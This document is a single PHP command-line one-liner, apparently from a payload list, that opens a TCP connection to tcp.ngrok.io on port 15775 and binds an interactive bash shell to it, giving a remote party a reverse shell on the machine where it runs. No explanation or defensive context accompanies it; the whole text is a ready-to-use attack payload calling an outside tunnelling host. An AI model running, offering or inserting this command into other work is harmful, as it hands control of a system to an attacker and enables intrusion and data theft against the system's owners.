php -r $sock=fsockopen("tcp.ngrok.io",15775);exec("/bin/bash -i <&3 >&3 2>&3");
